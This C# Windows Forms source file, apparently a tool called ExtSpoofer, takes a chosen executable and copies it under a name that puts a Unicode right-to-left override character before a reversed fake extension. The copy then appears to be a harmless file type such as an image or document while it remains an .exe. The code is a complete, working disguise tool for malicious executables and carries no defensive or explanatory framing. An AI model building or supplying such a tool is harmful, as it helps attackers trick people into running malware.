using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace ExtSpoofer
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            cbFakeExt.SelectedIndex = 0; 
        }

        private void btnBrowse_Click(object sender, EventArgs e)
        {
            OpenFileDialog ofd = new OpenFileDialog();
            ofd.Filter = "Executable Files (*.exe)|*.exe";
            if (ofd.ShowDialog() == DialogResult.OK)
            {
                txtFilePath.Text = ofd.FileName;
            }
        }

        private void btnSpoof_Click(object sender, EventArgs e)
        {
            string filePath = txtFilePath.Text;
            string fakeExt = cbFakeExt.Text.Replace(".", "");

            if (!File.Exists(filePath) || string.IsNullOrWhiteSpace(fakeExt))
            {
                MessageBox.Show("Enter a Compatible Extension!", "error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                return;
            }

            string originalName = Path.GetFileNameWithoutExtension(filePath);
            string extension = Path.GetExtension(filePath);
            string dir = Path.GetDirectoryName(filePath);

            string reverseExt = new string(fakeExt.Reverse().ToArray());
            string spoofedName = $"{originalName}\u202e{reverseExt}{extension}";
            string newPath = Path.Combine(dir, spoofedName);

            try
            {
                File.Copy(filePath, newPath);
                MessageBox.Show("Spoofing Success!\nNew File: " + newPath, "Done", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show("Error: " + ex.Message);
            }
        }
    }
}
